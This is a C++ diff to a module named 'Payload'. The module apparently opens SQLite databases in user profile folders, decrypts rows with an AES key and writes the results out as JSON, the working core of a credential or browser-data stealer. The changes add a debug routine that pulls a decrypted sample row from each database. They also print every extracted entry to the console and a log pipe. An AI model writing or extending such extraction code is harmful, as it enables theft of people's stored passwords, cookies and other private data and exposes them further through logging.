@@ -613,21 +613,93 @@ namespace Payload
             }
         }
 
-        // Debug function to dump an ExtractionConfig fields to the log
-        void DumpExtractionConfig(const Data::ExtractionConfig &cfg)
+        // Debug function to dump an ExtractionConfig fields and sample JSON to the log
+        void DumpExtractionConfig(const Data::ExtractionConfig &cfg, sqlite3 *db = nullptr, const std::vector<uint8_t> &aesKey = {})
         {
-            Log("[CFG] dbRelativePath=" + cfg.dbRelativePath.u8string());
-            Log("[CFG] outputFileName=" + cfg.outputFileName);
-            Log("[CFG] sqlQuery=" + cfg.sqlQuery);
+            // Create object to store config data
+            struct ConfigData {
+                std::string dbPath;
+                std::string fileName;
+                std::string query;
+                bool hasPreSetup;
+                bool hasFormatter;
+                std::string sampleJson;
+            } configObj;
+
+            // Read data into object
+            configObj.dbPath = cfg.dbRelativePath.u8string();
+            configObj.fileName = cfg.outputFileName;
+            configObj.query = cfg.sqlQuery;
+            configObj.hasPreSetup = static_cast<bool>(cfg.preQuerySetup);
+            configObj.hasFormatter = static_cast<bool>(cfg.jsonFormatter);
+            configObj.sampleJson = "N/A - No database connection";
+
+            // Try to get sample JSON if we have database and key
+            if (db && !aesKey.empty() && cfg.jsonFormatter)
+            {
+                std::any preQueryState;
+                if (cfg.preQuerySetup)
+                {
+                    if (auto state = cfg.preQuerySetup(db))
+                        preQueryState = *state;
+                }
+
+                sqlite3_stmt *stmt = nullptr;
+                if (sqlite3_prepare_v2(db, cfg.sqlQuery.c_str(), -1, &stmt, nullptr) == SQLITE_OK)
+                {
+                    if (sqlite3_step(stmt) == SQLITE_ROW)
+                    {
+                        if (auto jsonResult = cfg.jsonFormatter(stmt, aesKey, preQueryState))
+                        {
+                            configObj.sampleJson = *jsonResult;
+                        }
+                        else
+                        {
+                            configObj.sampleJson = "Failed to format JSON";
+                        }
+                    }
+                    else
+                    {
+                        configObj.sampleJson = "No data rows found";
+                    }
+                    sqlite3_finalize(stmt);
+                }
+                else
+                {
+                    configObj.sampleJson = "SQL query failed: " + std::string(sqlite3_errmsg(db));
+                }
+            }
+
+            // Print object to console and log
+            std::ostringstream oss;
+            oss << "\n=== ExtractionConfig Object ===\n";
+            oss << "dbPath: " << configObj.dbPath << "\n";
+            oss << "fileName: " << configObj.fileName << "\n";
+            oss << "query: " << configObj.query << "\n";
+            oss << "hasPreSetup: " << (configObj.hasPreSetup ? "true" : "false") << "\n";
+            oss << "hasFormatter: " << (configObj.hasFormatter ? "true" : "false") << "\n";
+            oss << "sampleJson: " << configObj.sampleJson << "\n";
+            oss << "==============================\n";
+
+            std::string output = oss.str();
+            
+            // Print to console (stdout)
+            printf("%s", output.c_str());
+            fflush(stdout);
+
+            // Also log via pipe
+            Log(output);
         }
 
         void ExtractDataFromProfile(const fs::path &profilePath, const Data::ExtractionConfig &dataCfg, const std::vector<uint8_t> &aesKey)
         {
-            // Log the config for debugging
-            DumpExtractionConfig(dataCfg);
             fs::path dbPath = profilePath / dataCfg.dbRelativePath;
             if (!fs::exists(dbPath))
+            {
+                // Log the config without database access
+                DumpExtractionConfig(dataCfg);
                 return;
+            }
 
             sqlite3 *db = nullptr;
             std::string uriPath = dbPath.string();
@@ -639,10 +711,16 @@ namespace Payload
                 if (db)
                     sqlite3_close_v2(db);
                 Log("[-] Failed to open database " + dbPath.u8string() + ": " + sqlite3_errmsg(db));
+                // Log the config without database access
+                DumpExtractionConfig(dataCfg);
+                return;
             }
             auto dbCloser = [](sqlite3 *d)
             { if(d) sqlite3_close_v2(d); };
             std::unique_ptr<sqlite3, decltype(dbCloser)> dbGuard(db, dbCloser);
+
+            // Log the config with database access and sample JSON
+            DumpExtractionConfig(dataCfg, dbGuard.get(), aesKey);
 
             std::any preQueryState;
             if (dataCfg.preQuerySetup)
@@ -676,6 +754,13 @@ namespace Payload
                         out << ",\n";
                     first = false;
                     out << *jsonEntry;
+                    
+                    // Display JSON result to console and log
+                    std::string displayMsg = "[JSON] " + *jsonEntry;
+                    printf("%s\n", displayMsg.c_str());
+                    fflush(stdout);
+                    Log(displayMsg);
+                    
                     count++;
                 }
             }
